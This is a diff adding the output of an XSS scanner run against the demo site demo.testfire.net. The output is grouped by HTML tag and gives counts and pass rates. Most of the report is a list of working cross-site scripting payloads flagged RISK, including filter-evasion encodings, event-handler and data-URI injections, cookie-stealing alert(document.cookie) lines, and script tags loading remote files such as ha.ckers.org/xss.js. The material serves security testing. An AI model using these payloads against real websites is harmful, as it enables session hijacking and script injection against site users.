@@ -1,0 +1,462 @@
+Target URL: http://demo.testfire.net
+
+tag: <a>
+	TOTAL: 29
+	RISK : 9
+	SAFE : 20
+	AVG  : 69.0%
+
+	detail:
+		RISK: <a href="data:application/x-x509-user cert;&NewLine;base64&NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="&#09;&#10;&#11;>X</a
+		RISK: <a href="javascript:void(0)" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>
+		RISK: <a/href="javascript:&#13; javascript:prompt(1)"><input type="X">
+		RISK: <a href="jAvAsCrIpT&colon;alert&lpar;1&rpar;">X</a>
+		RISK: <a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>
+		RISK: <math><a xlink:href="//jsfiddle.net/t846h/">click
+		RISK: <a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe
+		RISK: <math><a xlink:href="//jsfiddle.net/t846h/">click
+		RISK: <a href="data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203">Click Me</a>
+
+
+tag: <audio>
+	TOTAL: 1
+	RISK : 1
+	SAFE : 0
+	AVG  : 0.0%
+
+	detail:
+		RISK: <audio src=1 onerror=alert(1)>
+
+
+tag: <b>
+	TOTAL: 2
+	RISK : 0
+	SAFE : 2
+	AVG  : 100.0%
+
+	detail:
+
+
+tag: <blink>
+	TOTAL: 1
+	RISK : 1
+	SAFE : 0
+	AVG  : 0.0%
+
+	detail:
+		RISK: &#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver {Firefox & Opera}
+
+
+tag: <body>
+	TOTAL: 12
+	RISK : 3
+	SAFE : 9
+	AVG  : 75.0%
+
+	detail:
+		RISK: <body/onload=&lt;!--&gt;&#10alert(1)>
+		RISK: <body onscroll=alert(XSS)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
+		RISK: <HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;"></BODY></HTML>
+
+
+tag: <br>
+	TOTAL: 1
+	RISK : 0
+	SAFE : 1
+	AVG  : 100.0%
+
+	detail:
+
+
+tag: <button>
+	TOTAL: 5
+	RISK : 5
+	SAFE : 0
+	AVG  : 0.0%
+
+	detail:
+		RISK: <div style="xg-p:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)" onclick="alert(1)">x</button>
+		RISK: <form><button formaction=javascript&colon;alert(1)>CLICKME
+		RISK: <form><button formaction="javascript:alert(XSS)">lol
+		RISK: <form id="test" /><button form="test" formaction="javascript:alert(123)">TESTHTML5FORMACTION
+		RISK: <form><button formaction="javascript:alert(123)">crosssitespt
+
+
+tag: <div>
+	TOTAL: 12
+	RISK : 1
+	SAFE : 11
+	AVG  : 91.7%
+
+	detail:
+		RISK: <div/style="width:expression(confirm(1))">X</div> {IE7}
+
+
+tag: <embed>
+	TOTAL: 8
+	RISK : 6
+	SAFE : 2
+	AVG  : 25.0%
+
+	detail:
+		RISK: <embed src="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">
+		RISK: <embed code="http://businessinfo.co.uk/labs/xss/xss.swf" allowscriptaccess=always>
+		RISK: <EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
+		RISK: <EMBED SRC="http://ha.ckers.org/xss.swf" AllowScriptAccess="always"></EMBED>
+		RISK: <embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+		RISK: <embed src="javascript:alert(1)">
+
+
+tag: <font>
+	TOTAL: 2
+	RISK : 1
+	SAFE : 1
+	AVG  : 50.0%
+
+	detail:
+		RISK: <h1><font color=blue>hellox worldss</h1>
+
+
+tag: <form>
+	TOTAL: 5
+	RISK : 3
+	SAFE : 2
+	AVG  : 40.0%
+
+	detail:
+		RISK: <form><isindex formaction="javascript&colon;confirm(1)"
+		RISK: <form><iframe &#09;&#10;&#11; src="javascript&#58;alert(1)"&#11;&#10;&#09;;>
+		RISK: &#00;</form><input type&#61;"date" onfocus="alert(1)">
+
+
+tag: <frame>
+	TOTAL: 2
+	RISK : 0
+	SAFE : 2
+	AVG  : 100.0%
+
+	detail:
+
+
+tag: <frameset>
+	TOTAL: 1
+	RISK : 1
+	SAFE : 0
+	AVG  : 0.0%
+
+	detail:
+		RISK: <frameset onload=alert(123)>
+
+
+tag: <h1>
+	TOTAL: 1
+	RISK : 0
+	SAFE : 1
+	AVG  : 100.0%
+
+	detail:
+
+
+tag: <head>
+	TOTAL: 1
+	RISK : 0
+	SAFE : 1
+	AVG  : 100.0%
+
+	detail:
+
+
+tag: <html>
+	TOTAL: 1
+	RISK : 0
+	SAFE : 1
+	AVG  : 100.0%
+
+	detail:
+
+
+tag: <iframe>
+	TOTAL: 20
+	RISK : 14
+	SAFE : 6
+	AVG  : 30.0%
+
+	detail:
+		RISK: <iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00>
+		RISK: <iframe/src="data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==">
+		RISK: <iframe/src="data:text/html,<svg &#111;&#110;load=alert(1)>">
+		RISK: <iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>
+		RISK: <iframe/%00/ src=javaSCRIPT&colon;alert(1)
+		RISK: /*iframe/src*/<iframe/src="<iframe/src=@"/onload=prompt(1) /*iframe/src*/>
+		RISK: <iframe style="xg-p:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)">
+		RISK: <iframe/onreadystatechange=alert(1)
+		RISK: <input value=<><iframe/src=javascript:confirm(1)
+		RISK: <iframe src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe>
+		RISK: <iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>
+		RISK: <iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
+		RISK: <iframe src=http://ha.ckers.org/scriptlet.html <
+		RISK: <iframe xmlns="#" src="javascript:alert(1)"></iframe>
+
+
+tag: <img>
+	TOTAL: 61
+	RISK : 22
+	SAFE : 39
+	AVG  : 63.9%
+
+	detail:
+		RISK: <IMG SRC=javascript:alert(&quot;XSS&quot;)>
+		RISK: <img src=xss onerror=alert(1)>
+		RISK: <img/src=`%00` onerror=this.onerror=confirm(1)
+		RISK: <img src=`%00`&NewLine; onerror=alert(1)&NewLine;
+		RISK: <img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>
+		RISK: <img src=`xx:xx`onerror=alert(1)>
+		RISK: <--`<img/src=` onerror=alert(1)> --!>
+		RISK: <IMG """><SCRIPT>alert("XSS")</SCRIPT>">
+		RISK: <IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
+		RISK: <IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
+		RISK: <IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
+		RISK: <IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+		RISK: <img src=javascript:alert(&quot;XSS&quot;)>
+		RISK: <!--<img src="--><img src=x onerror=alert(XSS)//">
+		RISK: <![><img src="]><img src=x onerror=alert(XSS)//">
+		RISK: <style><img src="</style><img src=x onerror=alert(XSS)//">
+		RISK: &lt;IMG SRC=javascript&#058;alert(String&#46;fromCharCode(88,83,83))&gt;
+		RISK: &lt;IMG SRC=javascript&#058;alert(&quot;XSS&quot;)&gt;
+		RISK: <IMG """><SCRIPT>alert("XSS")</SCRIPT>">
+		RISK: <!--<img src="--><img src=x onerror=alert(123)//">
+		RISK: <style><img src="</style><img src=x onerror=alert(123)//">
+		RISK: <img src=asdf onerror=alert(document.cookie)>
+
+
+tag: <input>
+	TOTAL: 5
+	RISK : 3
+	SAFE : 2
+	AVG  : 40.0%
+
+	detail:
+		RISK: <input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
+		RISK: <input onfocus=write(XSS) autofocus>
+		RISK: <input onblur=write(XSS) autofocus><input autofocus>
+
+
+tag: <li>
+	TOTAL: 1
+	RISK : 0
+	SAFE : 1
+	AVG  : 100.0%
+
+	detail:
+
+
+tag: <link>
+	TOTAL: 2
+	RISK : 0
+	SAFE : 2
+	AVG  : 100.0%
+
+	detail:
+
+
+tag: <marquee>
+	TOTAL: 1
+	RISK : 0
+	SAFE : 1
+	AVG  : 100.0%
+
+	detail:
+
+
+tag: <meta>
+	TOTAL: 10
+	RISK : 4
+	SAFE : 6
+	AVG  : 60.0%
+
+	detail:
+		RISK: <meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>
+		RISK: <meta http-equiv="refresh" content="0;url=javascript:confirm(1)">
+		RISK: <meta http-equiv="refresh" content="0;javascript&colon;alert(1)"/>
+		RISK: <META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
+
+
+tag: <object>
+	TOTAL: 6
+	RISK : 3
+	SAFE : 3
+	AVG  : 50.0%
+
+	detail:
+		RISK: <object data="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">
+		RISK: <object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>
+		RISK: <object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+
+
+tag: <others>
+	TOTAL: 36
+	RISK : 11
+	SAFE : 25
+	AVG  : 69.4%
+
+	detail:
+		RISK: '; alert(1);
+		RISK: ')alert(1);//
+		RISK: <a&#32;href&#61;&#91;&#00;&#93;"&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;">XYZ</a
+		RISK: %253cscript%253ealert(1)%253c/script%253e
+		RISK: javascript:alert("hellox worldss")
+		RISK: eval(a+b+c+d);
+		RISK: +ADw-script+AD4-alert(document.location)+ADw-/script+AD4-
+		RISK: %2BADw-script+AD4-alert(document.location)%2BADw-/script%2BAD4-
+		RISK: +ACIAPgA8-script+AD4-alert(document.location)+ADw-/script+AD4APAAi-
+		RISK: %2BACIAPgA8-script%2BAD4-alert%28document.location%29%2BADw-%2Fscript%2BAD4APAAi-
+		RISK: %253cscript%253ealert(document.cookie)%253c/script%253e
+
+
+tag: <plaintext>
+	TOTAL: 1
+	RISK : 0
+	SAFE : 1
+	AVG  : 100.0%
+
+	detail:
+
+
+tag: <script>
+	TOTAL: 109
+	RISK : 68
+	SAFE : 41
+	AVG  : 37.6%
+
+	detail:
+		RISK: <script>alert(123);</script>
+		RISK: <ScRipT>alert("XSS");</ScRipT>
+		RISK: <script>alert(123)</script>
+		RISK: <script>alert("hellox worldss");</script>
+		RISK: <script>alert("XSS")</script>
+		RISK: <script>alert("XSS");</script>
+		RISK: "><script>alert("XSS")</script>
+		RISK: <script>alert(/XSS")</script>
+		RISK: <script>alert(/XSS/)</script>
+		RISK: </script><script>alert(1)</script>
+		RISK: <ScRiPt>alert(1)</sCriPt>
+		RISK: <sVg><scRipt %00>alert&lpar;1&rpar; {Opera}
+		RISK: <ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?
+		RISK: <script /*%00*/>/*%00*/alert(1)/*%00*/</script /*%00*/
+		RISK: http://www.google<script .com>alert(document.location)</script
+		RISK: <script ^__^>alert(String.fromCharCode(49))</script ^__^
+		RISK: </style &#32;><script &#32; :-(>/**/alert(document.location)/**/</script &#32; :-(
+		RISK: <script ~~~>alert(0%0)</script ~~~>
+		RISK: <script src="data:text/javascript,alert(1)"></script>
+		RISK: http://www.<script>alert(1)</script .com
+		RISK: <svg><script ?>alert(1)
+		RISK: <svg contentScriptType=text/vbs><script>MsgBox+1
+		RISK: <script>+-+-1-+-+alert(1)</script>
+		RISK: <script itworksinallbrowsers>/*<script* */alert(1)</script
+		RISK: <svg><script>//&NewLine;confirm(1);</script </svg>
+		RISK: <svg><script onlypossibleinopera:-)> alert(1)
+		RISK: <script x> alert(1) </script 1=2
+		RISK: <script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>
+		RISK: <SCRIPT>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</SCRIPT>
+		RISK: <<SCRIPT>alert("XSS");//<</SCRIPT>
+		RISK: "><s"%2b"cript>alert(document.cookie)</script>
+		RISK: foo<script>alert(1)</script>
+		RISK: <scr<script>ipt>alert(1)</scr</script>ipt>
+		RISK: <SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+		RISK: <SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+		RISK: <<SCRIPT>alert("XSS");//<</SCRIPT>
+		RISK: <script>alert("hellox worldss")</script>&safe=high&cx=006665157904466893121:su_tzknyxug&cof=FORID:9#510
+		RISK: <script>alert("XSS");</script>&search=1
+		RISK: <? foo="><script>alert(1)</script>">
+		RISK: <! foo="><script>alert(1)</script>">
+		RISK: </ foo="><script>alert(1)</script>">
+		RISK: <! foo="[[[Inception]]"><x foo="]foo><script>alert(1)</script>">
+		RISK: <% foo><x foo="%><script>alert(123)</script>">
+		RISK: <script>({0:#0=alert/#0#/#0#(0)})</script>
+		RISK: <svg xmlns="http://www.w3.org/2000/svg">LOL<script>alert(123)</script></svg>
+		RISK: &lt;SCRIPT&gt;alert(/XSS/&#46;source)&lt;/SCRIPT&gt;
+		RISK: <SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
+		RISK: <SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+		RISK: <SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+		RISK: <<SCRIPT>alert("XSS");//<</SCRIPT>
+		RISK: <SCRIPT>a=/XSS/alert(a.source)</SCRIPT>
+		RISK: </TITLE><SCRIPT>alert("XSS");</SCRIPT>
+		RISK: <SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT>
+		RISK: <SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+		RISK: <? foo="><script>alert(1)</script>">
+		RISK: <! foo="><script>alert(1)</script>">
+		RISK: </ foo="><script>alert(1)</script>">
+		RISK: <script>({0:#0=alert/#0#/#0#(123)})</script>
+		RISK: <script src="#">{alert(1)}</script>;1
+		RISK: <svg xmlns="#"><script>alert(1)</script></svg>
+		RISK: "><s"%2b"cript>alert(document.cookie)</script>
+		RISK: "><ScRiPt>alert(document.cookie)</script>
+		RISK: "><<script>alert(document.cookie);//<</script>
+		RISK: foo<script>alert(document.cookie)</script>
+		RISK: <scr<script>ipt>alert(document.cookie)</scr</script>ipt>
+		RISK: </script><script >alert(document.cookie)</script>
+		RISK: <script>alert(1)</script>
+		RISK: "><script>alert(String.fromCharCode(66, 108, 65, 99, 75, 73, 99, 101))</script>
+
+
+tag: <span>
+	TOTAL: 2
+	RISK : 0
+	SAFE : 2
+	AVG  : 100.0%
+
+	detail:
+
+
+tag: <style>
+	TOTAL: 9
+	RISK : 2
+	SAFE : 7
+	AVG  : 77.8%
+
+	detail:
+		RISK: <style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>
+		RISK: LOL<style>*{/*all*/color/*all*/:/*all*/red/*all*/;/[0]*IE,Safari*[0]/color:green;color:bl/*IE*/ue;}</style>
+
+
+tag: <svg>
+	TOTAL: 2
+	RISK : 2
+	SAFE : 0
+	AVG  : 0.0%
+
+	detail:
+		RISK: <svg/onload=alert(1)
+		RISK: <svg onload="javascript:alert(123)" xmlns="#"></svg>
+
+
+tag: <table>
+	TOTAL: 4
+	RISK : 0
+	SAFE : 4
+	AVG  : 100.0%
+
+	detail:
+
+
+tag: <var>
+	TOTAL: 1
+	RISK : 1
+	SAFE : 0
+	AVG  : 0.0%
+
+	detail:
+		RISK: <var onmouseover="prompt(1)">On Mouse Over</var>
+
+
+tag: <video>
+	TOTAL: 1
+	RISK : 1
+	SAFE : 0
+	AVG  : 0.0%
+
+	detail:
+		RISK: <video src=1 onerror=alert(1)>
+
+
+수행시간 192.085107초
